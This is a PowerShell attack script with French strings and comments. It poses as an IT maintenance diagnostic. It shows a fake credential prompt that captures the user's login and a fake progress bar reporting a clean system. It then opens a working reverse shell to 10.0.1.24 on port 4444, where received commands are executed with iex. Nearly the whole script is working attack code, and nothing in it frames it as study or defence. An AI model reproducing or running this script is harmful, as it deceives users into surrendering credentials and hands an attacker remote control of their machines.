# 1. Demande de mot de passe (Fake Prompt)
$caption = "Authentification Requise - Agent de Maintenance IT";
$message = "Veuillez saisir vos identifiants pour autoriser le diagnostic du système.";
$credential = $host.ui.PromptForCredential($caption, $message, "$env:userdomain\$env:username", "");



$activities = @("Vérification des registres", "Analyse des pilotes réseau", "Optimisation du cache système", "Nettoyage des fichiers temporaires")

for ($i = 1; $i -le 100; $i++) {
    $activity = $activities[($i % $activities.Length)]
    Write-Progress -Activity "Diagnostic de Maintenance en cours..." -Status "$i% Complété" -PercentComplete $i -CurrentOperation "$activity..."
    Start-Sleep -Milliseconds 50 # Ajuste la vitesse ici pour que ça dure ~5-10 secondes
}

Write-Host "Diagnostic terminé avec succès. Aucun problème détecté." -ForegroundColor Green

# 4. Lancement du Reverse Shell (en arrière-plan pour ne pas bloquer le script)
$client = New-Object System.Net.Sockets.TCPClient('10.0.1.24', 4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
